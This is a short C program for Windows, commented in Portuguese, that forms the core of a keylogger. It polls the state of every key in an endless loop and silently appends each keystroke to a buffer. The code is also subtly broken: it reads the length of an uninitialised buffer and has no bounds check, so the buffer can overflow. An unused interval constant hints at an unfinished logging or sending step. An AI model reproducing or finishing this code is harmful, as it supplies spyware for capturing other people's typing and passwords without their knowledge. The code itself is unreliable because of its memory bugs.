#include <stdio.h>
#include <windows.h>

#define BUFFER_SIZE 4096
#define INTERVALO 60

int main() {
    short keyState;
    char buffer[BUFFER_SIZE];
     size_t len = strlen(buffer);

    while (1) {
        // Loop através das teclas
        for (int key = 8; key <= 255; key++) {
            keyState = GetAsyncKeyState(key);

            // Verifica se a tecla foi pressionada
            if (keyState & 0x0001) {
                

                if (key >= 'A' && key <= 'Z') {
                    
                    buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                    buffer[len] = '\0';

                } 
                
                else {
                    switch (key) {
                        case VK_SPACE:
                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                            buffer[len] = '\0';
                            break;
                        case VK_RETURN:
                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                            buffer[len] = '\0';
                            break;
                        case VK_TAB:
                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                            buffer[len] = '\0';
                            break;
                        default:
                            buffer[len++] = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                            buffer[len] = '\0';
                    }
                }

               
            }
        }

        Sleep(20); // Evita sobrecarrega da CPU
    }
}
